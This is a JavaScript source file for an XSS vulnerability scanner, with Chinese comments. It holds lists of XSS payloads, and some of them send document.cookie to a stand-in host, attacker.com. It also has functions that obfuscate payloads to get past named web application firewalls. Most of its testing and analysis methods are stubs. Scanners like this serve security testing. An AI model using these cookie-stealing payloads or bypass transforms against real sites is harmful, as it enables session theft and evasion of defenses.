import { ConfigManager } from './config.js';
import { requestManager } from './requestManager.js';

class XSSDetector {
    constructor() {
        this.config = null;
        this.payloads = new Map();
        this.contexts = new Map();
        this.wafSignatures = new Set();
        this.encodingHandler = new EncodingHandler();
        this.validator = new XSSValidator();
        this.resultAnalyzer = new XSSResultAnalyzer();
        this.environmentDetector = new EnvironmentDetector();
    }

    async initialize() {
        this.config = await ConfigManager.load();
        this.initializePayloads();
        this.initializeContexts();
        this.initializeWafSignatures();
    }

    // 初始化XSS payloads
    initializePayloads() {
        // 基础反射型XSS payloads
        this.payloads.set('reflected', [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg><script>alert(1)</script></svg>',
            '<body onload=alert(1)>',
            '<input autofocus onfocus=alert(1)>',
            '<select autofocus onfocus=alert(1)>',
            '<textarea autofocus onfocus=alert(1)>',
            '<keygen autofocus onfocus=alert(1)>',
            '<div/onmouseover="alert(1)">style="width:100%;height:100%;position:fixed;left:0;top:0"</div>',
            '<svg><script>alert(1)</script></svg>'
        ]);

        // DOM型XSS payloads
        this.payloads.set('dom', [
            '"><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '"><svg><script>alert(1)</script></svg>',
            '" onmouseover="alert(1)',
            '" onfocus="alert(1)',
            '" onblur="alert(1)',
            '" onkeypress="alert(1)',
            '" onkeydown="alert(1)',
            '" onkeyup="alert(1)',
            '" onselect="alert(1)'
        ]);

        // 存储型XSS payloads
        this.payloads.set('stored', [
            '<script>fetch("http://attacker.com?cookie="+document.cookie)</script>',
            '<img src=x onerror="fetch(\'http://attacker.com?cookie=\'+document.cookie)">',
            '<svg><script>fetch("http://attacker.com?cookie="+document.cookie)</script></svg>'
        ]);
    }

    // 初始化上下文检测
    initializeContexts() {
        this.contexts.set('html', /<[^>]*>/);
        this.contexts.set('attribute', /[a-zA-Z-]+=["']/);
        this.contexts.set('script', /<script[^>]*>/);
        this.contexts.set('style', /<style[^>]*>/);
        this.contexts.set('comment', /<!--[\s\S]*?-->/);
        this.contexts.set('data', /data:[^;]+;base64,/);
    }

    // 初始化WAF特征
    initializeWafSignatures() {
        this.wafSignatures.add('ModSecurity');
        this.wafSignatures.add('Cloudflare');
        this.wafSignatures.add('AWS WAF');
        this.wafSignatures.add('Akamai');
    }

    // 智能payload选择
    selectPayload(input, context) {
        const { contextAware, wafAware, minConfidence } = this.config.xssDetection.payloadSelection;
        
        // 分析上下文
        const contextType = this.analyzeContext(input, context);
        
        // 分析WAF
        const wafType = wafAware ? this.detectWaf(input) : null;
        
        // 选择payload
        let selectedPayloads = [];
        if (contextType) {
            selectedPayloads = this.payloads.get(contextType) || [];
        } else {
            // 如果没有特定上下文，使用所有payload
            selectedPayloads = Array.from(this.payloads.values()).flat();
        }
        
        // 应用WAF绕过技术
        if (wafType) {
            selectedPayloads = this.applyWafBypass(selectedPayloads, wafType);
        }
        
        // 计算payload的置信度
        const payloadsWithConfidence = selectedPayloads.map(payload => ({
            payload,
            confidence: this.calculateConfidence(payload, contextType, wafType)
        }));
        
        // 过滤低置信度的payload
        return payloadsWithConfidence
            .filter(p => p.confidence >= minConfidence)
            .map(p => p.payload);
    }

    // 分析上下文
    analyzeContext(input, context) {
        for (const [type, pattern] of this.contexts) {
            if (pattern.test(input)) {
                return type;
            }
        }
        return null;
    }

    // 检测WAF
    detectWaf(input) {
        // 这里可以添加更复杂的WAF检测逻辑
        for (const signature of this.wafSignatures) {
            if (input.includes(signature)) {
                return signature;
            }
        }
        return null;
    }

    // WAF绕过技术
    applyWafBypass(payloads, wafType) {
        const { techniques } = this.config.xssDetection.wafBypass;
        
        return payloads.map(payload => {
            let bypassedPayload = payload;
            
            for (const technique of techniques) {
                switch (technique) {
                    case 'caseVariation':
                        bypassedPayload = this.caseVariation(bypassedPayload);
                        break;
                    case 'encodingVariation':
                        bypassedPayload = this.encodingVariation(bypassedPayload);
                        break;
                    case 'commentObfuscation':
                        bypassedPayload = this.commentObfuscation(bypassedPayload);
                        break;
                    case 'unicodeEncoding':
                        bypassedPayload = this.unicodeEncoding(bypassedPayload);
                        break;
                    case 'hexEncoding':
                        bypassedPayload = this.hexEncoding(bypassedPayload);
                        break;
                    case 'base64Encoding':
                        bypassedPayload = this.base64Encoding(bypassedPayload);
                        break;
                }
            }
            
            return bypassedPayload;
        });
    }

    // 各种WAF绕过技术实现
    caseVariation(payload) {
        return payload.split('').map(char => 
            Math.random() > 0.5 ? char.toUpperCase() : char.toLowerCase()
        ).join('');
    }

    encodingVariation(payload) {
        return encodeURIComponent(payload)
            .replace(/%/g, '\\%')
            .replace(/\\/g, '\\\\');
    }

    commentObfuscation(payload) {
        return payload.replace(/</g, '<!-- --><')
                     .replace(/>/g, '><!-- -->');
    }

    unicodeEncoding(payload) {
        return payload.split('').map(char => 
            '\\u' + char.charCodeAt(0).toString(16).padStart(4, '0')
        ).join('');
    }

    hexEncoding(payload) {
        return payload.split('').map(char => 
            '\\x' + char.charCodeAt(0).toString(16).padStart(2, '0')
        ).join('');
    }

    base64Encoding(payload) {
        return btoa(payload);
    }

    // 计算payload的置信度
    calculateConfidence(payload, contextType, wafType) {
        let confidence = 0.5; // 基础置信度

        // 根据上下文调整置信度
        if (contextType) {
            confidence += 0.2;
        }

        // 根据WAF类型调整置信度
        if (wafType) {
            confidence += 0.1;
        }

        // 根据payload长度调整置信度
        if (payload.length > 10) {
            confidence += 0.1;
        }

        return Math.min(confidence, 1.0);
    }

    // 误报过滤
    filterFalsePositives(input) {
        const { patterns, minLength, maxLength } = this.config.xssDetection.falsePositiveFilter;
        
        // 检查长度
        if (input.length < minLength || input.length > maxLength) {
            return false;
        }
        
        // 检查模式
        for (const pattern of patterns) {
            if (pattern.test(input)) {
                return false;
            }
        }
        
        return true;
    }

    // 检测XSS漏洞
    async detectXSS(input, context) {
        try {
            // 检测环境
            const environment = this.environmentDetector.detectEnvironment();
            
            // 分析上下文
            const inputContext = this.analyzeContext(input, context);
            
            // 选择payload
            const selectedPayloads = this.selectPayload(input, context);
            
            // 处理编码
            const encodedPayloads = selectedPayloads.map(payload => 
                this.encodingHandler.handleEncoding(payload, environment)
            );
            
            // 测试payload
            const results = await Promise.all(
                encodedPayloads.map(payload => this.testPayload(payload, input, context))
            );
            
            // 分析结果
            const analysis = this.resultAnalyzer.analyzeResponse(results, input);
            
            // 验证结果
            const isValid = this.validator.validateResults(analysis);
            
            return {
                isVulnerable: isValid && analysis.confidence > 0.8,
                confidence: analysis.confidence,
                context: inputContext,
                payloads: selectedPayloads,
                details: analysis
            };
        } catch (error) {
            console.error('XSS detection error:', error);
            return {
                isVulnerable: false,
                confidence: 0,
                error: error.message
            };
        }
    }

    // 测试单个payload
    async testPayload(payload, input, context) {
        // 这里实现具体的payload测试逻辑
        // 可以发送请求或执行DOM操作
        return {
            payload,
            success: false,
            response: null
        };
    }
}

class XSSValidator {
    validateResults(analysis) {
        // 实现结果验证逻辑
        return true;
    }
}

class XSSResultAnalyzer {
    analyzeResponse(results, input) {
        // 实现响应分析逻辑
        return {
            confidence: 0,
            details: {}
        };
    }
}

class EnvironmentDetector {
    detectEnvironment() {
        // 实现环境检测逻辑
        return {
            server: 'unknown',
            framework: 'unknown',
            security: {},
            encoding: {}
        };
    }

    adjustStrategy(environment) {
        // 实现策略调整逻辑
        return {
            filterPayloads: (payloads, env) => payloads
        };
    }
}

export const xssDetector = new XSSDetector(); 